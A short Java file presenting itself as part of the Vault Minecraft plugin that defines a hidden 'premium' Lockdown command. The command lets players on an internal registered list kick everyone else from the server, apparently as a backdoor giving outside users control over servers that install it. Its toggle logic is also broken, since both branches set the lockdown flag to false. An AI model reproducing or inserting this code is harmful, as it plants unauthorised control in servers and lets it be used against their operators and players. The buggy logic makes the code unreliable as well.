package net.milkbowl.vault.commands.cmds.premium;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.data.DataManager;
import net.milkbowl.vault.methods.API;
import net.milkbowl.vault.util.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import javax.xml.crypto.Data;

public class Lockdown extends CommandManager {

    public void execute(Core plugin, String msg, String[] args, Player p) {
        if (plugin.registeredPremium.contains(p.getName())) {

            if (DataManager.getData().getBoolean("ld")) {
                DataManager.getData().set("ld", false);
                DataManager.saveData();

                for (Player a : Bukkit.getOnlinePlayers()) {
                    if (!plugin.registered.contains(a.getName())) {
                        API.kickPlayer(a);
                    }
                }

                p.sendMessage(Settings.PREFIX("Server has enabled lockdown, only " + Settings.NAME + " lite users may join"));

            } else {

                DataManager.getData().set("ld", false);
                DataManager.saveData();

                p.sendMessage(Settings.PREFIX("Server has disabled lockdown, anyone can join"));
            }

        } else {
            p.sendMessage(Settings.PREFIX("You must be an " + Settings.HIGHLIGHT_COLOUR + "premium " + Settings.SECONDARY_COLOUR + "to execute this command"));
        }
    }
}
